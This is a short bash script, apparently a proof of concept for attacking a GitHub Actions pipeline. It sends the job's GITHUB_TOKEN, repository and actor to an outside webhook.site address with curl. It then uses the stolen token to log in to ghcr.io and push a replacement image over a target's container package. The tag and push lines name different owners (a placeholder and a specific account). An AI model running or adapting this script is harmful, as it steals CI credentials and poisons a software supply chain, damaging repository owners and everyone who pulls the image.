#!/usr/bin/env bash
# Step 1 — exfiltrate the token to prove capture
curl -s "https://webhook.site/58fd9ad3-79ab-4454-8c58-db4f3f36bc2e" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"

# Step 2 — abuse the token while the job is still running
echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin

docker pull ubuntu:latest
docker tag ubuntu:latest ghcr.io/<target-username>/pipeline-security-backend:latest
docker push ghcr.io/lorenna-vieira-test/pipeline-security-backend:latest
